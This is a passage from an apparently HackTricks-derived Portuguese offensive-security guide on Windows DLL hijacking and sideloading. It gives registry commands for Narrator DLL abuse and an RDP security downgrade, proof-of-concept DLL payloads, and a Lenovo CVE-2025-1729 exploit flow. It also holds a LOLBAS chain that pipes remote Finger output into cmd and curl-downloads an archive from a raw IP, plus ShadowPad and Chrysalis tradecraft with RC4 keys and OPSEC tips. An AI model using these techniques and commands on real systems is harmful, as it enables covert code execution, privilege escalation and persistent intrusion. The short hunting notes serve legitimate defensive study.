- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o comando acima, iniciar o Narrator carrega a DLL plantada. Na secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL será executada como SYSTEM na secure desktop.

Execução como SYSTEM acionada por RDP (movimentação lateral)
- Permita a camada de segurança clássica do RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conecte-se via RDP ao host e, na tela de logon, pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL será executada como SYSTEM na secure desktop.
- A execução para quando a sessão RDP é encerrada — injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registro de uma Accessibility Tool (AT) integrada (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e, em seguida, definir `configuration` com o nome dessa AT. Isso faz proxy de uma execução arbitrária sob o framework de Accessibility.

Notas
- Escrever em `%windir%\System32` e alterar valores de HKLM requer privilégios de administrador.
- Toda a lógica do payload pode ficar em `DLL_PROCESS_ATTACH`; não são necessários exports.

## Estudo de caso: CVE-2025-1729 - Escalação de privilégios usando TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), catalogado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalhes da vulnerabilidade

- **Componente**: `TPQMAssistant.exe`, localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarefa agendada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` é executada diariamente às 9:30 AM no contexto do usuário conectado.
- **Permissões do diretório**: gravável por `CREATOR OWNER`, permitindo que usuários locais depositem arquivos arbitrários.
- **Comportamento de busca de DLL**: tenta carregar `hostfxr.dll` primeiro a partir do diretório de trabalho e registra "NAME NOT FOUND" quando ausente, indicando precedência da busca no diretório local.

### Implementação do exploit

Um atacante pode colocar um stub malicioso `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código no contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo do Ataque

1. Como um usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a execução da tarefa agendada às 9:30, no contexto do usuário atual.
3. Se um administrador estiver conectado quando a tarefa for executada, a DLL maliciosa será executada na sessão do administrador com integridade média.
4. Encadeie técnicas padrão de bypass do UAC para elevar a partir da integridade média até privilégios de SYSTEM.

## Estudo de Caso: Dropper de MSI CustomAction + DLL Side-Loading via Host Assinado (wsc_proxy.exe)

Atores de ameaça frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads em um processo confiável e assinado.<sup>[[10]](#references)</sup>

Visão geral da cadeia
- O usuário baixa o MSI. Uma CustomAction é executada silenciosamente durante a instalação gráfica (por exemplo, uma ação LaunchApplication ou VBScript), reconstruindo o próximo estágio a partir de recursos incorporados.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par de exemplo: wsc_proxy.exe assinado pela Avast + wsc.dll controlada pelo atacante).
- Quando o EXE assinado é iniciado, a ordem de pesquisa de DLL do Windows carrega primeiro wsc.dll do diretório de trabalho, executando o código do atacante sob um processo pai assinado (ATT&CK T1574.001).

Análise de MSI (o que procurar)
- Tabela CustomAction:
- Procure entradas que executem executáveis ou VBScript. Padrão suspeito de exemplo: LaunchApplication executando um arquivo incorporado em segundo plano.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Payloads incorporados/divididos no CAB do MSI:
- Extração administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou use lessmsi: lessmsi x package.msi C:\out
- Procure vários fragmentos pequenos que sejam concatenados e descriptografados por uma CustomAction de VBScript. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading prático com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do próprio diretório.
- wsc.dll: DLL do atacante. Se nenhuma exportação específica for necessária, DllMain pode ser suficiente; caso contrário, crie uma proxy DLL e encaminhe as exportações necessárias para a biblioteca genuína enquanto executa o payload em DllMain.
- Crie um payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar uma DLL de encaminhamento que também execute seu payload.

- Essa técnica depende da resolução do nome da DLL pelo binário host. Se o host usar caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack poderá falhar.
- KnownDLLs, SxS e exports encaminhados podem influenciar a precedência e devem ser considerados durante a seleção do binário host e do conjunto de exports.

## Tríades assinadas + payloads criptografados (estudo de caso ShadowPad)

A Check Point descreveu como o Ink Dragon implanta o ShadowPad usando uma **tríade de três arquivos** para se misturar a software legítimo e manter o payload principal criptografado no disco:<sup>[[12]](#references)</sup>

1. **EXE host assinado** – fornecedores como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um binário do Windows (por exemplo, `conhost.exe`), mas a assinatura Authenticode permanece válida.
2. **DLL loader maliciosa** – colocada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, descriptografá-lo e fazer o reflective mapping do ShadowPad.
3. **Blob de payload criptografado** – geralmente armazenado como `<name>.tmp` no mesmo diretório. Após fazer o memory mapping do payload descriptografado, o loader exclui o arquivo TMP para destruir evidências forenses.

Notas de tradecraft:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se passe por um binário do Windows e, ao mesmo tempo, mantenha a assinatura do fornecedor; portanto, reproduza o hábito do Ink Dragon de colocar binários com aparência de `conhost.exe` que, na realidade, são utilitários da AMD/NVIDIA.
* Como o executável permanece confiável, a maioria dos controles de allowlisting precisa apenas que sua DLL maliciosa esteja ao lado dele. Concentre-se em personalizar a DLL loader; o parent assinado normalmente pode ser executado sem alterações.
* O decryptor do ShadowPad espera que o blob TMP esteja ao lado do loader e possa ser gravado, para que possa zerar o arquivo após o mapping. Mantenha o diretório gravável até o payload ser carregado; depois que estiver na memória, o arquivo TMP poderá ser excluído com segurança para fins de OPSEC.

### LOLBAS stager + cadeia de sideloading de arquivo staged (finger → tar/curl → WMI)

Os operadores combinam DLL sideloading com LOLBAS para que o único artefato customizado no disco seja a DLL maliciosa ao lado do EXE confiável:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** O PowerShell oculto inicia `cmd.exe /c`, obtém comandos de um servidor Finger e os encaminha para o `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtém texto via TCP/79; `| cmd` executa a resposta do servidor, permitindo que os operadores alternem o servidor de second stage no lado do servidor.

- **Download/extração integrada:** Baixe um arquivo com uma extensão benigna, descompacte-o e faça o staging do alvo do sideload junto com a DLL em uma pasta `%LocalAppData%` aleatória:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirects; `tar -xf` usa o tar integrado do Windows.

- **Execução via WMI/CIM:** Inicie o EXE via WMI para que a telemetria mostre um processo criado por CIM enquanto ele carrega a DLL colocada no mesmo diretório:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binários que preferem DLLs locais (por exemplo, `intelbq.exe`, `nearby_share.exe`); o payload (por exemplo, Remcos) é executado sob o nome confiável.

- **Hunting:** Gere um alerta para `forfiles` quando `/p`, `/m` e `/c` aparecerem juntos; essa combinação é incomum fora de scripts administrativos.


## Estudo de caso: dropper NSIS + sideload do Bitdefender Submission Wizard (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma cadeia de atualização confiável para entregar um dropper empacotado com NSIS que fazia staging de um DLL sideload e de payloads totalmente executados na memória.<sup>[[13]](#references)</sup>

Fluxo de tradecraft
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca-o como **HIDDEN**, coloca um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, uma `log.dll` maliciosa e um blob criptografado `BluetoothService`, e então inicia o EXE.
- O EXE host importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` carrega o blob via mmap; `LogWrite` o descriptografa com um stream baseado em LCG customizado (constantes **0x19660D** / **0x3C6EF35F**, material da chave derivado de um hash anterior), sobrescreve o buffer com shellcode em plaintext, libera os temporários e salta para ele.
- Para evitar uma IAT, o loader resolve APIs fazendo hashing dos nomes dos exports usando **FNV-1a basis 0x811C9DC5 + prime 0x100019**, aplicando depois um avalanche no estilo Murmur (**0x85EBCA6B**) e comparando com hashes-alvo com salt.

Main shellcode (Chrysalis)
- Descriptografa um módulo principal semelhante a PE repetindo add/XOR/sub com a chave `gQ2JR&9;` em cinco passagens; depois carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para concluir a resolução dos imports.
- Reconstrói strings de nomes de DLL em runtime usando transformações de bit-rotate/XOR por caractere e, em seguida, carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada tabela de exports em blocos de 4 bytes com mixing no estilo Murmur e só recorre a `GetProcAddress` se o hash não for encontrado.

Configuração incorporada e C2
- A configuração fica dentro do arquivo `BluetoothService` colocado no disco, no **offset 0x30808** (tamanho **0x980**), e é descriptografada com RC4 usando a chave `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Os beacons constroem um perfil de host delimitado por pontos, adicionam a tag `4Q` no início e o criptografam com RC4 usando a chave `vAuig34%^325hGV` antes de `HttpSendRequestA` via HTTPS. As respostas são descriptografadas com RC4 e distribuídas por um switch de tags (`4T` shell, `4V` execução de processo, `4W/4X` gravação de arquivo, `4Y` leitura/exfiltração, `4\\` desinstalação, `4` enumeração de unidades/arquivos + casos de transferência em chunks).
- O modo de execução é controlado pelos argumentos da CLI: sem argumentos = instala persistência (service/Run key) apontando para `-i`; `-i` reinicia o próprio processo com `-k`; `-k` ignora a instalação e executa o payload.

Loader alternativo observado
- A mesma intrusão colocou o Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` a partir de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O código C fornecido pelo atacante incorporava shellcode, era compilado e executado na memória sem gravar um PE no disco. Reproduza com:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compilação e execução baseada em TCC importava `Wininet.dll` em runtime e obtinha um shellcode de segundo estágio de uma URL hardcoded, fornecendo um loader flexível que se disfarçava de uma execução do compilador.

## Sideloading de hosts assinados com proxying de exports + estacionamento de threads do host

Algumas cadeias de DLL sideloading adicionam **engenharia de estabilidade** para manter o host legítimo ativo por tempo suficiente para carregar os estágios posteriores corretamente, em vez de travar após o carregamento da DLL maliciosa.<sup>[[11]](#references)</sup>

Padrão observado
- Coloque um EXE confiável ao lado de uma DLL maliciosa usando o nome de dependência esperado, como `version.dll`.
- A DLL maliciosa faz **proxy de cada export esperado** para a DLL de sistema real (por exemplo, `%SystemRoot%\\System32\\version.dll`), para que a resolução de imports continue funcionando e o processo do host permaneça operacional.
- Após o carregamento, a DLL maliciosa **aplica um patch no entry point do host** para que a thread principal entre em um loop infinito de `Sleep`, em vez de sair ou executar caminhos de código que terminariam o processo.
- Uma nova thread executa o trabalho malicioso real: descriptografar o nome ou caminho da DLL do próximo estágio (RC4/XOR são comuns) e então carregá-la com `LoadLibrary`.

Por que isso importa
- O proxying normal de DLLs preserva a compatibilidade da API, mas não garante que o host permanecerá ativo por tempo suficiente para os estágios posteriores.
- Estacionar a thread principal em `Sleep(INFINITE)` é uma maneira simples de manter o processo assinado residente enquanto o loader executa a descriptografia, o staging ou o bootstrap de rede em uma worker thread.
- Procurar apenas por um `DllMain` suspeito pode deixar este padrão passar despercebido se o comportamento relevante ocorrer depois que o entry point do host for aplicado e uma thread secundária for iniciada.

Workflow mínimo
1. Copie o EXE do host assinado e determine de qual DLL ele resolve a partir do diretório local.
2. Crie uma proxy DLL que exporte as mesmas funções e as encaminhe para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma worker thread.
4. A partir dessa thread, aplique um patch no entry point do host ou na rotina de início da thread principal para que ela entre em loop usando `Sleep`.
5. Descriptografe o nome/configuração da DLL do próximo estágio e chame `LoadLibrary` ou faça o manual-map do payload.

Pontos de foco defensivos
- Processos assinados que carregam `version.dll` ou bibliotecas comuns semelhantes de seu próprio diretório de aplicação, em vez de `System32`.
- Patches de memória no entry point do processo logo após o carregamento da imagem, especialmente saltos/chamadas redirecionados para `Sleep`/`SleepEx`.
- Threads criadas por uma proxy DLL que chamam imediatamente `LoadLibrary` em uma segunda DLL com um nome descriptografado.
- Proxy DLLs com todos os exports, colocadas ao lado de executáveis de fornecedores dentro de diretórios de staging graváveis, como `ProgramData`, `%TEMP%` ou caminhos de arquivos compactados extraídos.

## References

- [1] [Red Canary – Insights de Inteligência: janeiro de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalação de privilégios usando TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking no Windows. Exemplo simples em C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore distribui novo malware visando a Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: quando DLL Hijacks encontram Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers digitais: anatomia de campanhas de personificação em evolução que distribuem Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interesses convergentes: análise de clusters de ameaças que visam um governo do Sudeste Asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Por dentro do Ink Dragon: revelando a rede de retransmissão e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – O backdoor Chrysalis: uma análise aprofundada do toolkit do Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → cadeia de DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Rastreamento das campanhas de espionagem de 2026 do APT iraniano Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rápido e furioso: operações do Nimbus Manticore durante o conflito iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ações de tarefas](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 visa governos e infraestrutura crítica do Sudeste Asiático](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
